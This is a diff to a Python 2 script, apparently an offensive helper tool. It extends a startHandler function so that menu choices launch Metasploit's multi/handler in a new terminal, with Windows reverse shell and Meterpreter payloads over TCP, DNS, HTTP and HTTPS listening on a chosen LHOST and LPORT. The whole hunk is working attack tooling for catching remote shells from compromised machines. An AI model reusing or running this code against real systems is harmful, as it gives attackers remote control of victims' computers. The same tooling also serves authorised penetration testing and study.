@@ -122,7 +122,35 @@ def startHandler():
                         'use exploit/multi/handler;set payload windows/shell_reverse_tcp;\
                         set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
                 elif payload == "2":    
-                        print payload   
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/shell/reverse_tcp;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid 
+                elif payload == "3":    
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/shell/reverse_tcp_dns;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
+                elif payload == "4":    
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
+                elif payload == "5":    
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
+                elif payload == "6":    
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/meterpreter/reverse_http;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
+                elif payload == "7":    
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid               
         else:
                 print "\n\n Shutdown requested...Goodbye..."
                 exit(0)       
